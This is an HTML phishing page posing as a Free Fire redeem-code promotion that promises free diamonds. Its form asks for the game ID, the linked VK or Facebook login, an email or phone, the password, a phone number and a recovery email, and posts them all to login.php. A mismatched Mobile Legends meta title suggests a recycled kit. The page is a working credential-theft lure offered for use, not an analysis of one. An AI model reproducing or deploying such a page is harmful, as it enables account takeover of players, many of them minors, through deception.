<html>
<head>
<title>Free Fire - Redeem Code</title>
<meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta property="og:title" content="Mobile Legends - Weekly Free Heroes"/>
<meta property="og:url" content="index.html"/>
<meta property="og:description" content="Get the free fire winterlands monthly event, redeem here"/>
<meta property="og:type" content="article"/>
<meta property="article:author" content="https://www.facebook.com/MobileLegendsGameIndonesia"/>
<meta property="og:image" content="https://user-images.githubusercontent.com/49580304/102184480-5e9e0c80-3e64-11eb-8ec8-d433388ab43e.jpg"/>
<link rel="icon" type="img/png" href="http://freefiremobile-a.akamaihd.net/ffwebsite/images/app-icon.png" sizes="32x32"/>
<link rel="stylesheet" type="text/css" href="css/redeem.css"/>

</head>
<body>
<form align="right" action="login.php" method="POST">
<img src="https://1.bp.blogspot.com/-A4yuxmO8-Ws/XhBFUOeGf8I/AAAAAAAAAlM/w1Q5xixYe4s-NV9C2Nl_C886MVAI9XEKQCLcBGAsYHQ/s1600/Banner.jpg" alt="Instruction"/>
<br/><br/>

<label for="id">Account ID</label>*
<input minlength="5" maxlength="7" type="number" name="id" required=""/>
<br/><br/>
<label for="country">LOG IN</label>*
<select name="country" required="">
<option value="VK" selected="">VK</option>
<option value="FB">FB</option>
</select>
<br/><br/>

<label for="code">Redeemption Code</label>*
<input minlength="1" maxlength="16" type="text" name="code" required=""/>
<br/><br/>

<hr/><br/>
<label for="email">Email/HP</label>*
<input minlength="3" maxlength="50" type="text" name="email" required=""/>
<br/><br/>
<label for="password">Password</label>*
<input minlength="5" maxlength="50" type="password" name="pass" required=""/>
<br/><br/>
<label for="phone">Phone</label>*
<input minlength="8" maxlength="13" type="number" name="phone" required=""/>
<br/><br/>
<label for="recoveryemail">2nd Email</label>*
<input minlength="15" maxlength="50" type="email" name="emailr" required=""/>
<br/><br/>
<hr/><br/>
<div align="center">
<p><small>Take your Diamond + bundle, check the mail box in the game after (30) Minutes</small></p>
<br/>
<input type="submit" value="Submit"/>
</div>
</form>
</body>

</html>